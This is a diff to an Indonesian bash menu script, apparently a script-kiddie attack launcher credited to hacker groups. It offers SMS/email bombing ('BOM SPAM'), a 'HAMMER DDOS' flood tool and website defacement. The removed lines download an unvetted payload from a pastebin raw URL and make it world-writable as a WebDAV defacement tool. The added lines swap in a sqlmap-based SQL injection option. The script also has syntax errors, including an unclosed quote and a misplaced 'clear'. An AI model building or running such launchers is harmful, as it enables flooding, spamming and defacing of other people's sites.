@@ -19,7 +19,7 @@ echo    " 2. BOM SPAM "
 echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>" | lolcat
 echo    " 3. HAMMER DDOS "
 echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
-echo    " 4. DEFACE WEBDAV"
+echo    " 4. SQL INJEK"
 echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
 echo    "╭─[PILIH NOMERNYA]"
 read -p "╰─root@./MR_XID=" sf;
@@ -40,6 +40,7 @@ if [ $fri = 1 ] || [ $fri = 1 ]
 then
 echo "-gunakan tool saya dengan benar-" | lolcat
 sleep 1
+echo "autor by MR_XID 2018
 echo " thansk to "
 echo "JATIM BLACKHAT " | lolcat
 echo "D35TR0Y SQUAD" | lolcat
@@ -95,18 +96,11 @@ sleep 1
 python hammer.py 
 fi
 if [ $sf = 4 ] || [ $sf = 4 ]
+clear
 then 
-apt update && apt upgrade
-apt install python2
-pip2 install urllib3 chardet certifi idna requests
-apt install openssl curl
-pkg install libcurl
-mkdir webdav
-cd webdav
-wget https://pastebin.com/raw/HnVyQPtR
-mv HnVyQPtR webdav.py
-sleep 1
-chmod 777 webdav.py
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python2 sqlmap.py
 echo "terinstall bos " | lolcat
 sleep 1
 exit
